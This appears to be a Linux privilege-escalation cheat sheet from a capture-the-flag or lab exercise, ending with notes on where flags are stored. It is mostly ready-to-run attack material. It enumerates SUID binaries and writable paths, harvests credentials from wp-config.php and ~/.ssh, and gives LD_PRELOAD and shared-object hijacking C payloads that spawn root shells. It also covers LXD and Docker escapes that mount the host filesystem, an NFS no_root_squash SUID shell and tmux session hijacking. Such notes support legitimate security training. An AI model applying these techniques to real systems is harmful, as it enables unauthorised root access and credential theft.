List current processes:
```shell
ps au
```

List user's privileges:
```shell
sudo -l
```

List cron jobs:
```shell
ls -la /etc/cron.daily/
```

List file systems and additional drives:
```shell
lsblk
```

Find writable directories:
```shell
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

Find writable files:
```shell
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

# Kernel Exploit
---
Compile exploit:
```shell
gcc kernel_expoit.c -o kernel_expoit && chmod +x kernel_expoit
```

# Screen
---
Get screen version:
```shell
screen -v
```

# CronJob Abuse
---
Check if cronjob is running:
```shell
./pspy64 -pf -i 1000
```

# Special Permissions
---
Find suid binaries:
```shell
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

Find setguid binaries:
```shell
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

# Searching for Credentials
---
Searching for wordpress credentials in wp_config:
```shell
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
```

Find credentials in webroot:
```shell
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

Check for ssh keys in .ssh:
```shell
ls ~/.ssh
```

# Shared Libraries
---
List shared objects with ldd:
```shell
ldd /bin/ls
```

LD_PRELOAD exploit example:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Compile LD_PRELOAD example:
```shell
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

# Shared Object Hijacking
---
Exploiting vulnerable function in object example:
```c
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```

Compile exploit:
```shell
gcc src.c -fPIC -shared -o /development/libshared.so
```

# LDC/LXC
---
Unxip the alpine image:
```shell
unzip alpine.zip
```

Start the lxd initialization:
```shell
lxd init
```

Import the local image:
```shell
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

Start a privileged container:
```shell
lxc init alpine r00t -c security.privileged=true
```

Mount the host file system:
```shell
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

Start the container instance and run a root shell:
```shell
lxc start r00t
lxc exec r00t /bin/sh
```

# Docker
---
Members of the docker group can create privileged containers and mount to the root of the filesystem:
```shell
docker run -v /root:/mnt -it ubuntu
```

# Disk
---
Members of the disk group have full access to devices in /dev (like /dev/sda1) and can therefore access the entire filesystem:
```shell
debugfs
```

# ADM
---
Members of the adm group can read logs in /var/logs, which often contain credentials:
```shell
find /var/log --group adm
```

# Weak NFS Privileges
---
Some volumes may have been created with the no_root_squash flag, which allows low-privileged users to create files as the root user:
```shell
cat /etc/exports
gcc shell.c -o shell
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
./shell
```

# Hijacking Tmux Sessions
---
Some tmux sessions may still be running as a privileged and can be hijacked:
```shell
ps aux | grep tmux
ls -la /shareds
tmux -S /shareds
```
/home/barry/flag2.txt
flag3 in /var/log/tomcat
flag4 in /var/lib/tomcat9/
